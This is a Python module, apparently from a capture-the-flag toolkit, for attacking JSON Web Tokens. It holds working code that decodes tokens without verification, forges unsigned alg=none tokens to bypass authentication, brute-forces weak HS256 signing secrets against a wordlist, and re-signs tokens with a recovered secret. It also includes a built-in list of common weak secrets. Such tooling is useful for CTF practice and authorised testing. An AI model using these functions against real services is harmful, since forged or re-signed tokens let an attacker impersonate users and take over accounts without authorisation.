"""JWT parse / forge / weak-key brute force — §8 web.jwt.

Covers the three highest-frequency JWT CTF moves:
- decode (header+claims without verifying)
- forge with alg=none (the classic auth bypass)
- HS256 weak-secret brute force against a wordlist
- re-sign with a known/recovered secret
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any, Optional

from pydantic import BaseModel, Field


def _b64url_decode(seg: str) -> bytes:
    pad = (-len(seg)) % 4
    return base64.urlsafe_b64decode(seg + "=" * pad)


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


class JWTDecoded(BaseModel):
    header: dict[str, Any] = Field(default_factory=dict)
    payload: dict[str, Any] = Field(default_factory=dict)
    signature_b64: str = ""
    alg: str = ""
    valid_structure: bool = True


def decode(token: str) -> JWTDecoded:
    parts = token.strip().split(".")
    if len(parts) != 3:
        return JWTDecoded(valid_structure=False)
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except (ValueError, json.JSONDecodeError):
        return JWTDecoded(valid_structure=False)
    return JWTDecoded(
        header=header,
        payload=payload,
        signature_b64=parts[2],
        alg=str(header.get("alg", "")),
    )


def forge_none(payload: dict[str, Any], *, alg: str = "none") -> str:
    """Forge a token with alg=none (empty signature). Tries 'none'/'None'/'NONE'."""
    header = {"alg": alg, "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def sign_hs256(payload: dict[str, Any], secret: str, *, header: Optional[dict] = None) -> str:
    header = header or {"alg": "HS256", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


class BruteResult(BaseModel):
    found: bool
    secret: Optional[str] = None
    tried: int = 0


def brute_hs256(token: str, wordlist: list[str]) -> BruteResult:
    """Try each candidate secret against the token's HS256 signature."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return BruteResult(found=False)
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    want = _b64url_decode(parts[2])
    for i, cand in enumerate(wordlist, 1):
        sig = hmac.new(cand.encode(), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(sig, want):
            return BruteResult(found=True, secret=cand, tried=i)
    return BruteResult(found=False, tried=len(wordlist))


# A small built-in wordlist of secrets that show up constantly in JWT challenges.
COMMON_SECRETS = [
    "secret", "password", "123456", "key", "jwt", "admin", "changeme",
    "your-256-bit-secret", "secretkey", "supersecret", "s3cr3t", "test",
    "qwerty", "letmein", "default", "private", "token", "Sn1f", "1234567890",
    "secret123", "ctf", "flag", "root", "pass", "hunter2",
]
